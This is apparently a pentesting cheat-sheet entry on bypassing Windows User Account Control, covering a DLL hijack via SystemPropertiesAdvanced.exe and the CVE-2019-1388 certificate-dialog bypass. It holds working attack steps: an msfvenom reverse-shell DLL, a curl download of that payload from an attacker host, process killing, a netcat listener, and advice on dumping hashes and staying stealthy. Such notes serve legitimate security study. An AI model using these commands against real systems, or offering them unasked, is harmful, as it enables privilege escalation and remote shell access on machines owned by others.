---

## ðŸŸ  23 â˜… Bypassing UAC

---
### Technique Name:

Bypassing User Account Control (UAC) â€“ DLL Hijacking via SystemPropertiesAdvanced.exe
### Summary:

User Account Control (UAC) is a Windows feature that restricts elevated privileges unless explicitly granted by the user. However, it is not a security boundary and can often be bypassed to gain elevated execution without triggering a prompt. This technique leverages DLL hijacking via `SystemPropertiesAdvanced.exe`, an auto-elevated binary, and the search order Windows uses to load DLLs.
### Conditions:

- User must be in the Administrators group, but running in medium integrity.    
- EnableLUA must be enabled (`1`).
- Windows build must be â‰¤ 14393 (Windows 10 1607).
- The SystemPropertiesAdvanced.exe (32-bit) binary must be present.
- `%PATH%` must include a writable folder (e.g., `%LOCALAPPDATA%\Microsoft\WindowsApps`).
### Enumeration:

```powershell
# Check if user is in Administrators group
net localgroup administrators

# Check current user integrity level
whoami /groups

# Check if UAC is enabled
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# Check UAC level (0x5 means "Always notify")
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# Check OS version and build
[System.Environment]::OSVersion.Version

# Check %PATH% for writable folders
cmd /c echo %PATH%
```
### Exploitation Steps:

1. Generate malicious DLL    

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

2. Host DLL

```bash
sudo python3 -m http.server 8080
```

3. Download DLL on target

```powershell
curl http://10.10.14.3:8080/srrstr.dll -o "$env:LOCALAPPDATA\Microsoft\WindowsApps\srrstr.dll"
```

4. Terminate existing rundll32 processes

```cmd
tasklist /svc | findstr "rundll32"
taskkill /PID <pid> /F
```

5. Execute auto-elevated binary

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

6. Catch shell 

```bash
nc -lvnp 8443
```
### Post-Exploitation:

- Shell runs with elevated token (high integrity).
- Confirm privileges via `whoami /priv`.
- Search for misconfigurations or dump hashes with SYSTEM rights.    
- Maintain stealth â€“ this technique avoids GUI prompts and logs minimally.

### Notes:

- This DLL hijack abuses missing `srrstr.dll`.
- It was patched in later builds (>1607), making this version-dependent.    
- You may test the DLL directly with:

```cmd
rundll32 shell32.dll,Control_RunDLL C:\Path\To\srrstr.dll
```
### CVE-2019-1388 - Certificate Dialog UAC Bypass

This vulnerability abuses the certificate information dialog in UAC prompts. A signed binary (e.g., `hhupd.exe`) with a valid `SpcSpAgencyInfo` field spawns a browser as SYSTEM, from which you can break out into a SYSTEM shell.

Exploitation Steps:

1. Run `hhupd.exe` as admin.
2. In the UAC prompt, click "Show information about the publisher's certificate".
3. In the General tab, click the hyperlink in the "Issued By" field.
4. A browser opens as SYSTEM.
5. Right-click > View Page Source > Save As
6. In the save dialog, launch `cmd.exe` by typing its path and pressing Enter.

Patch released in Nov 2019, but many systems still vulnerable.
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #UAC_Bypass